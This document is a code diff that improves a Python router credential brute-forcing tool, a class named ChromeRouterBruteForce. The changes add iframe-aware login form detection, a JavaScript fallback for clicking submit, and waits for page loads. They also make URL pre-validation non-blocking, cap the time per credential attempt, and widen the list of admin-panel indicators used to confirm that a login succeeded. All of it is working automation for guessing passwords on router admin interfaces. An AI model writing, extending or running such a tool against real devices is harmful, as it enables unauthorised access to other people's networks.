@@ -270,10 +270,10 @@ class ChromeRouterBruteForce:
             return None
     
     def detect_login_form(self, driver):
-        """Detect login form fields on the page with better element detection"""
+        """Detect login form fields on the page with better element detection (iframe-aware)"""
         try:
             # Wait for page to load
-            time.sleep(2)
+            self.wait_strategies.wait_for_page_load(driver, 10)
             
             # Common field name patterns
             username_fields = [
@@ -423,6 +423,26 @@ class ChromeRouterBruteForce:
                             
                 except Exception as e:
                     print(f"{Colors.YELLOW}[!] JavaScript form detection failed: {e}{Colors.END}")
+
+            # If still not found, check iframes
+            if (not username_field or not password_field):
+                try:
+                    iframes = driver.find_elements(By.TAG_NAME, 'iframe')
+                    for iframe in iframes:
+                        try:
+                            driver.switch_to.frame(iframe)
+                            uf, pf = self.detect_login_form(driver)
+                            if uf and pf:
+                                username_field, password_field = uf, pf
+                                print(f"{Colors.BLUE}[*] Login form found inside an iframe{Colors.END}")
+                                break
+                        except Exception:
+                            driver.switch_to.default_content()
+                            continue
+                        finally:
+                            driver.switch_to.default_content()
+                except Exception:
+                    pass
             
             return username_field, password_field
             
@@ -718,11 +738,15 @@ class ChromeRouterBruteForce:
                     print(f"{Colors.YELLOW}[-] JavaScript fallback also failed: {js_error}{Colors.END}")
                     return False, None
             
-            # Find and click submit button
+            # Find and click submit button (with waits and JS fallback)
             try:
                 submit_button = self.find_submit_button(driver)
                 if submit_button:
-                    submit_button.click()
+                    try:
+                        self.wait_strategies.wait_for_element_clickable(driver, (By.XPATH, "//input[@type='submit']|//button[@type='submit']|//button[contains(text(), 'Login')]|//input[@value='Login']"), 5)
+                        submit_button.click()
+                    except Exception:
+                        driver.execute_script("arguments[0].click();", submit_button)
                 else:
                     # Try pressing Enter on password field
                     password_field.send_keys("\n")
@@ -731,7 +755,7 @@ class ChromeRouterBruteForce:
                 return False, None
             
             # Wait for page to load after login
-            time.sleep(3)
+            self.wait_strategies.wait_for_page_load(driver, 10)
             
             # Handle alerts (login failed messages)
             try:
@@ -791,7 +815,7 @@ class ChromeRouterBruteForce:
             return False, None
     
     def is_login_successful(self, driver, initial_url, initial_title):
-        """Check if login was successful with strict validation"""
+        """Check if login was successful with strict validation and stronger admin indicators"""
         try:
             current_url = driver.current_url
             current_title = driver.title
@@ -833,7 +857,9 @@ class ChromeRouterBruteForce:
                 'router management', 'device management', 'network management',
                 'system status', 'wan status', 'lan status', 'wireless status',
                 'firmware', 'system information', 'device information',
-                'logout', 'log out', 'sign out', 'exit'
+                'logout', 'log out', 'sign out', 'exit', 'admin', 'administrator',
+                'maintenance', 'tools', 'advanced', 'quick setup', 'wizard',
+                'status & statistics', 'interfaces', 'routing', 'firewall', 'qos'
             ]
             
             # Check for admin panel specific elements
@@ -856,7 +882,7 @@ class ChromeRouterBruteForce:
             form_count = sum(1 for element in form_elements if element in page_source)
             
             # Strict validation: Must have strong indicators AND not be on login page
-            if (strong_success_count >= 2 or admin_elements_count >= 3) and not still_on_login_page and form_count < 3:
+            if (strong_success_count >= 3 or admin_elements_count >= 4) and not still_on_login_page and form_count < 3:
                 print(f"{Colors.GREEN}[+] Strong success indicators found: {strong_success_count} strong, {admin_elements_count} admin{Colors.END}")
                 return True, current_url
             elif url_changed and url_improved and not still_on_login_page and form_count < 2:
@@ -877,10 +903,13 @@ class ChromeRouterBruteForce:
         try:
             print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
             
-            # Pre-validate URL before Chrome automation
-            if not self.pre_validate_url(url):
-                print(f"{Colors.YELLOW}[-] URL pre-validation failed: {url}{Colors.END}")
-                return False, None, None
+            # Pre-validate URL before Chrome automation (non-blocking)
+            try:
+                pre_ok = self.pre_validate_url(url)
+                if not pre_ok:
+                    print(f"{Colors.YELLOW}[-] URL pre-validation reported issues, continuing with Chrome for verification...{Colors.END}")
+            except Exception as _pre_err:
+                print(f"{Colors.YELLOW}[-] URL pre-validation error: {_pre_err}. Continuing...{Colors.END}")
             
             # Create Chrome driver
             driver = self.create_chrome_driver()
@@ -891,7 +920,7 @@ class ChromeRouterBruteForce:
             driver.set_page_load_timeout(30)
             driver.implicitly_wait(10)
             
-            # Navigate to URL with retry mechanism
+            # Navigate to URL with retry mechanism and per-attempt timeout
             max_retries = 3
             for attempt in range(max_retries):
                 try:
@@ -940,8 +969,9 @@ class ChromeRouterBruteForce:
             auth_type = self.detect_authentication_type(driver, url)
             print(f"{Colors.BLUE}[*] Detected auth type: {auth_type}{Colors.END}")
             
-            # Handle different authentication types
+            # Handle different authentication types with per-credential timeout
             final_url = None
+            start_attempt = time.time()
             
             if auth_type == 'http_basic':
                 success, final_url = self.handle_http_basic_auth(driver, url, username, password)
@@ -953,6 +983,11 @@ class ChromeRouterBruteForce:
                 # Try form-based as fallback
                 success, final_url = self.handle_form_based_auth(driver, username, password)
             
+            # Enforce per-credential timeout (hard cap)
+            if time.time() - start_attempt > max(20, self.timeout):
+                print(f"{Colors.YELLOW}[-] Credential attempt timed out (> {max(20, self.timeout)}s){Colors.END}")
+                success = False
+
             if success:
                 # Check if login was actually successful
                 login_success, admin_url = self.is_login_successful(driver, initial_url, initial_title)
